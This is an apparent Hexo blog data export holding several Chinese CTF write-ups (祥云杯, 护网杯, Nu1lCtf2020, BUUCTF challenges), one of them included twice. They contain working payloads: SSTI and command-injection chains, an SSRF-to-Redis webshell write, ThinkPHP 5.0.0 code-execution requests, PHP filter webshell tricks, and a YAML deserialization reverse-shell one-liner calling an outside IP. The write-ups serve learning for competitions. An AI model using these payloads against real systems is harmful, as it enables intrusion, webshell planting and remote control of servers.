{"meta":{"title":"buxqm","subtitle":null,"description":null,"author":"Ycj","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2019-09-10T12:46:13.000Z","updated":"2020-09-28T08:34:27.483Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"xyb/xyb","date":"2020-11-22T12:46:07.660Z","updated":"2020-11-22T12:49:22.912Z","comments":true,"path":"2020/11/22/xyb/xyb/","link":"","permalink":"http://yoursite.com/2020/11/22/xyb/xyb/","excerpt":"","text":"Web1 Command一道ping的命令执行|没有被过滤，使用||拼接命令，使用%09代替空格，过滤了许多读文件的命令，可以使用/bin/ca?绕过，过滤了*，尝试使用find /遍历目录。 1111||find%09/ 发现flag 2333，过滤了*，使用?代替。 1111||/bin/ca?%09/etc/.find????/????.txt flag{59e8c8d2-b274-4e77-82cc-c1c41d699685} Web2 flaskbot随便测试一下，发现打开了debug，发现程序读取直接读取cookie中的name，然后base64解密打印出来，但是在/路由下好像被字符串化了，不能直接ssti。 但是他获取数字使用了float方法num = float(request.form[&#39;num&#39;])。 Python的float能使用inf,-inf,nan来创造一些特殊浮点数，发现我们输入nan时赢了，并且打出了我们的名字，这里就是ssti点，使用文件读取，发现根目录无flag，只能通过命令执行来获取。 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/fl&apos;+&apos;ag&apos;).read()&#125;&#125; 读一下源码，得到黑名单，开始绕过。 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/app/app.py&apos;).read()&#125;&#125; 1[&apos;flag&apos;,&apos;os&apos;,&apos;system&apos;,&apos;popen&apos;,&apos;import&apos;,&apos;eval&apos;,&apos;chr&apos;,&apos;request&apos;, &apos;subprocess&apos;,&apos;commands&apos;,&apos;socket&apos;,&apos;hex&apos;,&apos;base64&apos;,&apos;*&apos;,&apos;?&apos;] 使用一把梭payload得到flag。 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &apos;ev&apos;+&apos;al&apos; in b.keys() %&#125; &#123;&#123; b[&apos;ev&apos;+&apos;al&apos;](&apos;__impor&apos;+&apos;t__(&quot;o&quot;+&quot;s&quot;).po&apos;+&apos;pen(&quot;cat /super_secret_fla&quot;+&quot;g&quot;+&quot;.txt&quot;).read()&apos;) &#125;&#125; &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; flag{3f17f077-c4f3-4298-be69-40693ab86396} Web3 easygogogo用go语言写的文件上传，cookie中有账号密码、文件名等一些数据，但是加了盐，无法破解。 抓包试了一下，发现可以任意目录穿越，实现任意文件覆盖，经过多次测试发现，即使重启靶机，只要文件目录不变，cookie是不会改变的，所以可以第一次覆盖/flag，得到该文件的cookie值，然后重启靶机，实现文件读取。 1cookie=Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAAB4/4IBAzEyMwEDMTIzAUcuL3VwbG9hZHMvNGU1YjA5YjIxNDlmNzYxOWNjYTE1NWM4YmQ2ZDhlZTUvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZwEgMWFjMzEzNWU1NTM0YzM0MDZiOWVlYjhlODRiMDdjMDIA 但是直接读取会出现图片不存在的问题，测试了许多次，发现需要首先上传一张图片，然后再修改cookie值，才能得到经过base64加密的flag。 解密得到flag flag{b311219d-a8d8-41d8-a953-171fffe9b128} Web4 doyouknowssrf这是一道原题https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ 这里使用parse_url来检测端口，都知道，parse_url和curl解析方式不一样比如下面的url，parse_url将baidu.com解析为主机，p@127.0.0.1:6379解析为密码，但是curl会将127.0.0.1:6379解析为ip:port，所以可以使用如下的payload来探测内网。 1url=http://u:p@127.0.0.1:6379@baidu.com 扫了一下常用端口，发现5000端口，是一个flask服务，还是一个ssrf，好家伙ssrf套ssrf！，还有一个6379端口，那肯定是用内网的falsk服务来打redis。 1?url=http://u:p@127.0.0.1:5000@baidu.com%3furl=https://baidu.com 试了一下，gopher和dict协议没点反应，后来从文章中了解到urllib库有一个csrf漏洞，那gopher能不能用就不重要了，可以使用这个csrf漏洞重新构造一个http请求包，这样我们就能将payload传递给redis，这里由于在内网，所以需要编码两次。 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250Aset%2520m%25201223%250D%250ATEST%253A%2520123 成功收到了一个报错，ssrf成功。 但是，这个ssrf还带密码，只能通过爆破来得到密码了，由于没有回显，所以只能使用slaveof命令将命令执行结果带入我们的vps中，如果密码正确，则会有一个ping指令发送过来。随便试了一下，发现密码是123456！，直接用Redis写Webshell。 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527aa%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A 得到flag flag{709df8e5-608a-47bc-bb9f-1256090ed06c} web5 easyzzz一个zzzcms的模板注入，老题目了，https://www.anquanke.com/post/id/212272#h2-10。 这道题测了半天，在/search post传keys有if会被直接ban掉，经过测试后发现get也能传，而且不会被BAN！！那就简单了，这题还加了点waf，出现system等函数会直接500，出现chr等函数会被直接拦截，但是可以用array_map和base_convert绕过，用亦或构造一个/， 123/=(base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36))readfile=base_convert(2146934604002,10,36)flag=base_convert(727432,%2010, 36) 然后执行readfile(/flag)即可得到flag。 1?location=search&amp;keys=&#123;if:array_map(base_convert(2146934604002,10,36),array((base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).base_convert(727432,%2010,%2036)))&#125;&#123;end%20if&#125; flag{9fcf8f2e-32e2-4d7a-bdf9-6da82f17c0e8} web6 profile system上传yaml，在下载的时候发现能够目录穿越读到源码/uploads/4e5b09b2149f7619cca155c8bd6d8ee5/../../app.py 读了一下源码，得到secretkey:Th1s_is_A_Sup333er_s1cret_k1yyyyy，发现伪造priviledge为elite可以触发yaml反序列化，使用工具伪造session。 还需要绕过正则，主要是不能有_和.，uiuctf2020有一个类似的题目https://hackmd.io/@harrier/uiuctf20。使用map调用eval，用16进制 12_=\\x5f.=\\x2e 绕过正则表达式，直接弹shell，/readflag读取flag。 1!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [&quot;\\x5f\\x5fimport\\x5f\\x5f(&apos;os&apos;)\\x2esystem(&apos;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 8\\x2e129\\x2e69\\x2e85 2333 &gt;/tmp/f&apos;)&quot;]]] flag{746ad7f8-14c2-465b-95bc-611328186899}","categories":[],"tags":[]},{"title":"祥云杯","slug":"祥云杯","date":"2020-11-20T16:00:00.000Z","updated":"2020-11-28T13:58:24.678Z","comments":true,"path":"2020/11/21/祥云杯/","link":"","permalink":"http://yoursite.com/2020/11/21/祥云杯/","excerpt":"","text":"Web1 Command一道ping的命令执行|没有被过滤，使用||拼接命令，使用%09代替空格，过滤了许多读文件的命令，可以使用/bin/ca?绕过，过滤了*，尝试使用find /遍历目录。 1111||find%09/ 发现flag 2333，过滤了*，使用?代替。 1111||/bin/ca?%09/etc/.find????/????.txt Web2 flaskbot随便测试一下，发现打开了debug，发现程序读取直接读取cookie中的name，然后base64解密打印出来，但是在/路由下好像被字符串化了，不能直接ssti。 但是他获取数字使用了float方法num = float(request.form[&#39;num&#39;])。 Python的float能使用inf,-inf,nan来创造一些特殊浮点数，发现我们输入nan时赢了，并且打出了我们的名字，这里就是ssti点，使用文件读取，发现根目录无flag，只能通过命令执行来获取。 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/fl&apos;+&apos;ag&apos;).read()&#125;&#125; 读一下源码，得到黑名单，开始绕过。 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/app/app.py&apos;).read()&#125;&#125; 1[&apos;flag&apos;,&apos;os&apos;,&apos;system&apos;,&apos;popen&apos;,&apos;import&apos;,&apos;eval&apos;,&apos;chr&apos;,&apos;request&apos;, &apos;subprocess&apos;,&apos;commands&apos;,&apos;socket&apos;,&apos;hex&apos;,&apos;base64&apos;,&apos;*&apos;,&apos;?&apos;] 使用一把梭payload得到flag。 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &apos;ev&apos;+&apos;al&apos; in b.keys() %&#125; &#123;&#123; b[&apos;ev&apos;+&apos;al&apos;](&apos;__impor&apos;+&apos;t__(&quot;o&quot;+&quot;s&quot;).po&apos;+&apos;pen(&quot;cat /super_secret_fla&quot;+&quot;g&quot;+&quot;.txt&quot;).read()&apos;) &#125;&#125; &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Web3 easygogogo用go语言写的文件上传，cookie中有账号密码、文件名等一些数据，但是加了盐，无法破解。 抓包试了一下，发现可以任意目录穿越，实现任意文件覆盖，经过多次测试发现，即使重启靶机，只要文件目录不变，cookie是不会改变的，所以可以第一次覆盖/flag，得到该文件的cookie值，然后重启靶机，实现文件读取。 1cookie=Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAAB4/4IBAzEyMwEDMTIzAUcuL3VwbG9hZHMvNGU1YjA5YjIxNDlmNzYxOWNjYTE1NWM4YmQ2ZDhlZTUvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZwEgMWFjMzEzNWU1NTM0YzM0MDZiOWVlYjhlODRiMDdjMDIA 但是直接读取会出现图片不存在的问题，测试了许多次，发现需要首先上传一张图片，然后再修改cookie值，才能得到经过base64加密的flag。 解密得到flag Web4 doyouknowssrf这是一道原题https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ 这里使用parse_url来检测端口，都知道，parse_url和curl解析方式不一样比如下面的url，parse_url将baidu.com解析为主机，p@127.0.0.1:6379解析为密码，但是curl会将127.0.0.1:6379解析为ip:port，所以可以使用如下的payload来探测内网。 1url=http://u:p@127.0.0.1:6379@baidu.com 扫了一下常用端口，发现5000端口，是一个flask服务，还是一个ssrf，好家伙ssrf套ssrf！，还有一个6379端口，那肯定是用内网的falsk服务来打redis。 1?url=http://u:p@127.0.0.1:5000@baidu.com%3furl=https://baidu.com 试了一下，gopher和dict协议没点反应，后来从文章中了解到urllib库有一个csrf漏洞，那gopher能不能用就不重要了，可以使用这个csrf漏洞重新构造一个http请求包，这样我们就能将payload传递给redis，这里由于在内网，所以需要编码两次。 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250Aset%2520m%25201223%250D%250ATEST%253A%2520123 成功收到了一个报错，ssrf成功。 但是，这个ssrf还带密码，只能通过爆破来得到密码了，由于没有回显，所以只能使用slaveof命令将命令执行结果带入我们的vps中，如果密码正确，则会有一个ping指令发送过来。随便试了一下，发现密码是123456！，直接用Redis写Webshell。 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527aa%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A 得到flag web5 easyzzz一个zzzcms的模板注入，老题目了，https://www.anquanke.com/post/id/212272#h2-10。 这道题测了半天，在/search post传keys有if会被直接ban掉，经过测试后发现get也能传，而且不会被BAN！！那就简单了，这题还加了点waf，出现system等函数会直接500，出现chr等函数会被直接拦截，但是可以用array_map和base_convert绕过，用亦或构造一个/， 123/=(base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36))readfile=base_convert(2146934604002,10,36)flag=base_convert(727432,%2010, 36) 然后执行readfile(/flag)即可得到flag。 1?location=search&amp;keys=&#123;if:array_map(base_convert(2146934604002,10,36),array((base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).base_convert(727432,%2010,%2036)))&#125;&#123;end%20if&#125; flag{9fcf8f2e-32e2-4d7a-bdf9-6da82f17c0e8} web6 profile system上传yaml，在下载的时候发现能够目录穿越读到源码/uploads/4e5b09b2149f7619cca155c8bd6d8ee5/../../app.py 读了一下源码，得到secretkey:Th1s_is_A_Sup333er_s1cret_k1yyyyy，发现伪造priviledge为elite可以触发yaml反序列化，使用工具伪造session。 还需要绕过正则，主要是不能有_和.，uiuctf2020有一个类似的题目https://hackmd.io/@harrier/uiuctf20，使用map调用eval，用16进制 1_=\\x5f .=\\x2e 绕过正则表达式，直接弹shell，/readflag读取flag。 1!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [&quot;\\x5f\\x5fimport\\x5f\\x5f(&apos;os&apos;)\\x2esystem(&apos;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 8\\x2e129\\x2e69\\x2e85 2333 &gt;/tmp/f&apos;)&quot;]]]","categories":[{"name":"祥云杯","slug":"祥云杯","permalink":"http://yoursite.com/categories/祥云杯/"}],"tags":[]},{"title":"护网杯","slug":"护网杯","date":"2020-10-25T16:00:00.000Z","updated":"2020-10-26T11:04:06.509Z","comments":true,"path":"2020/10/26/护网杯/","link":"","permalink":"http://yoursite.com/2020/10/26/护网杯/","excerpt":"","text":"SimpleCalculator一道计算题，过滤了许多函数，这与2018年国赛那题很像，不过过滤了base_convert，可以使用取反绕过。 12$pi=(~%8C%86%8C%8B%9A%92);$cos=(~%9C%9E%8B%DF%D0%99%93%9E%98);$pi($cos);$pi=system，$cos=cat /flag SQLManager这题是一道SQLLite注入，发现可以创建表名，发现和Zer0pts2020很像，我们可以想到使用as来复制表，这里要说一下sqllite中的系统表sqlite_master，该表存储着当前数据库的所有表的相关信息，比如表的名称，创建表的sql语句等等。 结果测试发现，该题表名不能含有单引号等特殊字符，所以我们可以使用中括号来包裹表名，让他复制sqllite_master来建表，从而得到sqllite_master中的信息。 1payload:[aaa] as select [sql][example] from sqlite_master; 得到了flag的表名和列名，直接读取flag 1[aaa] as select [flag_ThE_C0lumn][example] from flag_Y0U_c4ng_GUESS; easyphp打开，主界面存在一个任意文件包含，用伪协议读取一下源码，发现7fa3b767c460b54a2be4d49030b349c7.php，进入发现是一道绕过死亡exit的题目，死亡exit一般都是用过滤器混淆绕过，该题过滤了很多关键字，首先找找能用的过滤器 1preg_match('/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\\.\\./i', $content) 解一：zlib过滤器过滤了很多关键字，现在能用的过滤器只用string.strip_tags和压缩过滤器。 strip_tags就不说了，首先试一试压缩过滤器的作用。 123&lt;?phpecho file_get_contents(\"php://filter/read=zlib.deflate/resource=1.php\");?&gt; 1&lt;?php @eval($_POST['aa']);?&gt; 1.php就是下面这个正常的马，运行程序得到被压缩后的输出 那么我们将被压缩过的马url编码，之后能用zlib.unflate正常读取出来，还需要用?&gt;闭合之前的死亡exit;，使用strip_tags来将它过滤掉。 1?&gt;%B3%B1%2F%C8%28PpH-K%CC%D1P%89%0F%F0%0F%0E%89VOLT%8F%D5%B4%B6%B7%03%00 1payload:php://filter/write=string.strip_tags|zlib.inflate/%3f%3e%B3%B1%2F%C8%28PpH-K%CC%D1P%89%0F%F0%0F%0E%89VOLT%8F%D5%B4%B6%B7%03/resource=1.php 成功写入shell并将死亡exit过滤。 解二：利用首页的include包含shell文件Base64要求把每三个8Bit的字节转换为四个6Bit的字节，之后在6位的前面补两个0，形成8位一个字节的形式。所以base64解密会四个字节四个字节读取，而PHP在base64解密时，会默认丢弃掉超出base64编码表的的字符，所以 12&lt;?php exit;PD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg==PD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg== &lt;?php @eval($_POST[&apos;aa&apos;]);?&gt; 在解码时会被看成如下字符串。 1phpexitPD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg== 之前说到，会四个字节四个字节读取字符，而一个字符刚好就是一个字节，为了保证我们的马完整的被解出来，在它前面的字符串必须是四的倍数，而phpexit是7个字符，所以需要任意补足一个字符。 1p1hpexitPD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg== 之后在include用convert.base64-decode包含shell文件即可。","categories":[{"name":"专题  writeup","slug":"专题-writeup","permalink":"http://yoursite.com/categories/专题-writeup/"}],"tags":[]},{"title":"Nu1lCtf2020","slug":"nu1lctf2020","date":"2020-10-19T16:00:00.000Z","updated":"2020-10-21T14:33:57.178Z","comments":true,"path":"2020/10/20/nu1lctf2020/","link":"","permalink":"http://yoursite.com/2020/10/20/nu1lctf2020/","excerpt":"","text":"easyTP5关闭报错，写入文件下载源码看下版本，发现是5.0.0，存在任意代码执行漏洞，具体可以看看我的另一篇tp5.0.*漏洞复现，看看phpinfo。 1a=10&amp;_method=__construct&amp;method=GET&amp;filter[]=phpinfo 发现存在disable_function和open_basedir，无法直接getshell，赛后根据出题师傅的wp，将几种解法都复现一下，学习学习。 在filter中可以通过someClass::someMethod调用静态方法，发现在think\\Build类中，存在module静态方法可以用来写入文件。 当module不等于runtime时，会调用buildHello静态方法，创建按hello tp界面。 注意这行代码，我们可以控制的变量是$module 首先我们需要知道红圈中的内容是我们可以控制的，然后在创建目录的地方，我们可以目录穿越到public文件夹，尝试一下 1a=../public/555&amp;_method=__construct&amp;method=GET&amp;filter[]=think\\Build::module 但是我们发现报错了，原因是不符合namespace的命名格式，根据出题人师傅的WP，我们可以用a;&#39;/../../public/&#39;.phpinfo();这种方式来绕过，我觉得非常巧妙，这种方式既成功穿越目录，有使得php文件符合语法，膜。 1a=a;&apos;/../../public/&apos;.phpinfo();&amp;_method=__construct&amp;method=GET&amp;filter[]=think\\Build::module 但是这种方法只能在Windows上使用，因为linux在mkdir时，不允许有不存在的目录，但是当传入true参数是，允许有不存在目录的出现。 这在PHP中，会抛出一个warning。但如果我们传入参数-p，就允许存在不存在的目录，这一点在php中的体现是true参数，我们传入true参数，相当于执行了mkdir -p，刚好我们发现，在创建默认页面时，会在执行一次mkdir，而这次带上了true参数，但是在TP中，碰到warning就抛出异常结束运行了，所以我们需要想办法绕过它，在官方手册可以看到，我们可以通过设置error_reporting来设置报错级别。 所以我们可以执行error_reporting(‘任意字符串’)来绕过该报错，还有一个就是函数执行顺序的问题，这个出题人分析的很好了，我就不再分析了。payload如下 1a=../public/1&amp;b=a;&apos;/../../public/&apos;.phpinfo();&amp;_method=__construct&amp;method=GET&amp;filter[0]=think\\Build::module&amp;filter[1]=error_reporting 说一下执行顺序，首先创建../public1目录，然后执行error_reporting(‘../public/1’)等同于error_reporting(0)，然后就是创建我们的恶意文件，利用成功。。 注释绕过语法错误可以通过//注释掉路径，然后使用?&gt;闭合之前的代码，再写一个新的马。 1a=index//../../public/?&gt;&lt;?php @eval($_POST[&apos;aa&apos;]);?&gt;&amp;_method=__construct&amp;method=GET&amp;filter[]=think\\Build::module 把phpinfo()换成@eval($_POST[‘aa’])；,连接AntSword，使用Backtrace UAF即可绕过disable_function。 DockerManager打开源码，发现会将你输入的表单拼接成一道curl命令 1$cmd = 'curl --connect-timeout 10 ' . $host_addr . ' -g ' . $cert . $key . $cacert; 不过你输入的变量都会通过escapeshellarg添加一个单引号并将其他单引号转义，但是在Linux中，单引号的意思是剥夺所有字符的特殊意义，所以我们任然能够再curl变量中使用参数","categories":[{"name":"Nu1lCtf","slug":"Nu1lCtf","permalink":"http://yoursite.com/categories/Nu1lCtf/"}],"tags":[]},{"title":"","slug":"BUUCTF3","date":"2020-10-16T13:40:18.311Z","updated":"2020-11-28T13:57:20.479Z","comments":true,"path":"2020/10/16/BUUCTF3/","link":"","permalink":"http://yoursite.com/2020/10/16/BUUCTF3/","excerpt":"","text":"title: BUUCTF2date: 2020/10/29categories: writeup [SCTF2019]Flag Shoprobots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&#40;https://blog.csdn.net/TomorrowAndTuture/article/details/108565910&#41;`$&#39;`,表示的是最后一次模式匹配中匹配部分之后的字符串，也就是说match方法会将字符串分成三部分，匹配部分之前，匹配部分，匹配部分之后，所以当不存在匹配部分是，`$&#39;`就表示该变量。 &lt;%=$&#39;&gt;,需要url编码一次 payload=/work?secret=&amp;name=&lt;%25%3d%24%18%25&gt;&amp;do=&lt;%25%3d%24%18%25&gt;%20is%20working 得到SECRET,接下来就是JWT伪造了。 [CISCN2019 华东南赛区]Double Secret打开进入/secret路由，输入secret，从报错发现是RC4加密，密钥是HereIsTreasure，将解密后的字符串用模板渲染，存在SSTI。 payload: 1secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92 [watevrCTF-2019]Cookie Store打开题目，看见buyflag，可是前不够，题目有cookie，那就看看cookie,发现是一段base64加密过的cookie，解密。 ![image-20201028214648485]&#40;/images/BUUCTF3/image-20201028214648485.png&#41; 发现money，修改成100，传上去就能买到flag。 [GXYCTF2019]StrongestMind题目说算1000次，没想到真的是1000次，算就完事儿。 1234567891011121314151617181920212223242526import requestsimport reimport timeurl=\"http://903c7430-9683-4702-a278-3e79fdef8cf2.node3.buuoj.cn/index.php\"s=requests.session&amp;#40;&amp;#41;proxies = &amp;#123; \"http\": None, \"https\": None,&amp;#125;source=s.get&amp;#40;url,proxies=proxies&amp;#41;source.encdoing=\"utf-8\"expression=re.search&amp;#40;r'&amp;#40;\\d+ [+-/\\*] &amp;#41;+\\d+',source.text&amp;#41;.group&amp;#40;&amp;#41;result=eval&amp;#40;expression&amp;#41;params=&amp;#123;'answer':result&amp;#125;answer=s.post&amp;#40;url,data=params,proxies=proxies&amp;#41;for i in range&amp;#40;1000&amp;#41;: expression=re.search&amp;#40;r'&amp;#40;\\d+ [+-/\\*] &amp;#41;+\\d+',answer.text&amp;#41;.group&amp;#40;&amp;#41; result=eval&amp;#40;expression&amp;#41; params=&amp;#123;'answer':result&amp;#125; answer=s.post&amp;#40;url,data=params,proxies=proxies&amp;#41; answer.encoding=\"utf-8\" if i%50==0: time.sleep&amp;#40;1&amp;#41; print&amp;#40;answer.text&amp;#41;print&amp;#40;answer.text&amp;#41;print&amp;#40;source.text&amp;#41; [GYCTF2020]Easyphp打开题目，尝试了各种sql注入，发现无法注入，于是发现www.zip中有源码，审计一番，发现熟悉的字符串替换，还有lib.php中的类，那肯定是反序列化字符串逃逸了，在这里说一下链子，首先通过反序列化字符串逃逸控制nickname参数。 在updateHelper中有__destruct方法，使用echo输出$this-&gt;sql该值可控，在User类中有__toString方法，nickname可控。 1$this-&gt;nickname-&gt;update&amp;#40;$this-&gt;age&amp;#41;; ，而且Info类中有__call方法 1echo $this-&gt;CtrlCase-&gt;login&amp;#40;$argument[0]&amp;#41;; 在__call方法中，CtrlCase与argument都可控，所以可以用__tostring触发__call，让CtrlCase去触发DBctrl中的login方法。 看看DBCTRL类，发现login方法是传入一个sql语句，使用了预处理，所以无法注入。 1$result-&gt;bind_result&amp;#40;$idResult, $passwordResult&amp;#41;; 但是由于sql语句可控，所以查询结果的顺序是可控的，也就是说我们可以构造如下语句： 1select password,id from user where username=? 将password,id调换一下顺序，所以现在$idResult=password，返回得到密码。 12$age=&apos;loadunionloadloadloadloadloadloadloadloadloadloadunionloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadunionunionloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload&quot;;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:2:&amp;#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&amp;#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&amp;#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;i:1;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&amp;#123;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&amp;#125;&amp;#125;&amp;#125;s:3:&quot;any&quot;;s:1:&quot;1&quot;;&amp;#125;&amp;#125;&apos;;$nickname=&quot;1&quot;; [安洵杯 2019]不是文件上传文件上传确实上传不了，读一下源码吧，发现helper类中有__destruct方法，在upload.php中也有反序列化，估摸着是一道反序列化题，审一下代码逻辑。 ![image-20201029152801352]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201029152801352.png&#41; 将文件中的信息过滤后读取到数组中，注意$array[&#39;attr&#39;]的值是序列化后的值，之后调用save方法传入数据库中。 ![image-20201029152928750]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201029152928750.png&#41; 将数组中的键值对取出来，作为列名，值插入到images表中，可见这里insert是没有任何过滤的，所以我们可以使用sql注入任意控制插入的值。 反序列化的点在show.php中![image-20201029153211638]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201029153211638.png&#41; 将attr的值取出来，然后反序列化。所以现在思路就清晰了，利用sql注入控制attr的值，进行反序列化，链子非常简单，直接放exp了（PS:由于filename中不能有双引号，而在数据库中，字符串会转换成16进制，所以用16进制编码传值）。 1filename=&quot;1&apos;,1,1,1,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d&amp;#41;#.jpg&quot; 图片内容随便，控制文件名就好了。 [RootersCTF2019]I_&lt;3_Flask使用arjun探测参数发现name参数，尝试&#123;&#123;7*‘7’&#125;&#125;返回7777777得知是jinjia2模板注入，直接读flag。 1name=&amp;#123;&amp;#123;&amp;#40;&amp;#41;.__class__.__bases__[0].__subclasses__&amp;#40;&amp;#41;[80].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27]&amp;#40;%27o%27+%27s%27&amp;#41;.popen&amp;#40;&quot;cat%20flag.txt&quot;&amp;#41;.read&amp;#40;&amp;#41;&amp;#125;&amp;#125; [DDCTF 2019]homebrew event loop打开题目，下载源码，开始审计代码。 [NPUCTF2020]ezincludeget提交pass=cookie中的值就提示存在flflflflag.php，里面是一个文件包含，使用伪协议读取源码，发现过滤情况如下 123if&amp;#40;preg_match&amp;#40;'/data|input|zip/is',$file&amp;#41;&amp;#41;&amp;#123; die&amp;#40;'nonono'&amp;#41;;&amp;#125; 做到这里思路就断了，查看WriteUp发现了新姿势，在PHP7.0中，文件包含使用string.strip_tags会报Segment Fault错误，如果正在上传文件，则会将文件保存到tmp目录中，不会删除，通过目录扫描可以得到dir.php，读取源码发现列出了tmp目录。 1/flflflflag.php?file=php://filter/read=string.strip_tags/resource=index.php 同时上传文件，然后访问dir.php得到文件路径，包含之后在phpinfo中找到flag。 [EIS 2019]EzPOP下载源码，开始审计，很直白的反序列化，利用文件写入getshell，这里出现了thinkphp反序列化链中常见的死亡exit，不过filename和content是分开控制，使用php://filter协议中的base64过滤器绕过，json_encode返回的是字符串，可以用serialize函数处理。 